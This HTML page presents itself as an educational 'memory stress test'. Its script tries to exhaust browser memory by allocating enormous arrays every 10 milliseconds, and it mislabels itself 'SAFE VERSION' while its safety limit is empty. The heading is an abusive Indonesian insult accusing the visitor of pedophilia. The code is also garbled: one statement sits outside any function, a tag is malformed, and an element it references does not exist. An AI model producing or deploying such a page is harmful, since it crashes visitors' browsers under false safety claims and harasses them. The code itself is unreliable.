<!DOCTYPE html>
<html>
<head>
    <title>MEMORY STRESS TEST - EDUCATIONAL</title>
    <style>
        body { 
            background: black; 
            color: red; 
            font-family: monospace;
            text-align: center;
            padding: 50px;
        }
        .warning {
            border: 5px solid red;
            padding: 20px;
            margin: 20px;
            background: yellow;
            color: black;
        }
        button {
            padding: 15px 30px;
            font-size: 20px;
            margin: 10px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="warning">
        <h1>PEDOFIL KONTOL, LU BEGO BANGSAT,NGAPAIN LU DEKETIN ANAK ANAK?/h1>
        <p></p>
        <p><strong>DO NOT USE MALICIOUSLY</strong></p>
    </div>
    
    <h2>Memory Stress Test Simulator</h2>
    <script>
        let running = false;
        let memoryArray = [];
    
            if (running) return;
            running = true;
                        // Simulate memory allocation (SAFE VERSION)
            let interval = setInterval(() => {
                if (!running) {
                    clearInterval(interval);
                    return;
                }
                
                // Allocate memory
                let data = new Array(10000000000).fill('LEAKKK');
                memoryArray.push(data);
                
                // Update status
                let usedMB = (memoryArray.length * 8).toFixed(1);
                document.getElementById('status').textContent = 
                    `Allocated: ${memoryArray.length} arrays (~${usedMB} MB)`;
                
                // Safety limit
                
            }, 10);
    </script>
</body>
</html>
